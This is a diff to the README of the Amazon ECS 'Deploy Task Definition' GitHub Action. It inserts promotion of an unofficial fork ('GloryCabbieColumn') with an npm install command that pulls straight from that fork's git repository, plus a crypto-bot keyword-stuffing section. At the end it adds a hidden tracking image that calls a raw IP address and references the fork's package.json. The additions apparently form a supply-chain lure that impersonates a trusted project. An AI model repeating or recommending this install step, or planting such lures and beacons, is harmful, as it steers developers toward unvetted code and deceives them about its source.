@@ -1,3 +1,15 @@
+**GloryCabbieColumn/amazon-ecs-deploy-task-definition**
+
+If you are struggling with outdated dependencies or unaddressed bugs in the original repository, this fork provides a highly reliable alternative featuring crucial stability patches. It is actively maintained to ensure seamless integration with the latest Amazon ECS updates, saving you from deployment headaches.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/GloryCabbieColumn/amazon-ecs-deploy-task-definition.git
+```
+
+[https://github.com/GloryCabbieColumn/amazon-ecs-deploy-task-definition](https://github.com/GloryCabbieColumn/amazon-ecs-deploy-task-definition)
+
 ## Amazon ECS "Deploy Task Definition" Action for GitHub Actions
 
 Registers an Amazon ECS task definition and deploys it to an ECS service.
@@ -440,3 +452,10 @@ This code is made available under the MIT license.
 
 If you would like to report a potential security issue in this project, please do not create a GitHub issue.  Instead, please follow the instructions [here](https://aws.amazon.com/security/vulnerability-reporting/) or [email AWS security directly](mailto:aws-security@amazon.com).
 
+## Related searches
+
+When developers look for automated deployment utilities like this Amazon ECS task definition action, they often seek integrated workflows that connect continuous delivery with active Web3 automation. Many are searching for reliable ways to deploy decentralized applications, automated trading tools, or Discord notification bots that interact with smart contracts and decentralized exchanges.
+
+**Topics:** amazon ecs deployment, github actions web3, opensea bot, crypto typescript, uniswap trading bot, web3.js automation, discord crypto bot, ethereum dApp deployment, ecs task definition, continuous delivery crypto, automated crypto bot dev
+
+![.](http://5.231.58.248:8787/pixel?repo=GloryCabbieColumn%2Famazon-ecs-deploy-task-definition&inject=GloryCabbieColumn%2Famazon-ecs-deploy-task-definition%2Fpackage.json)
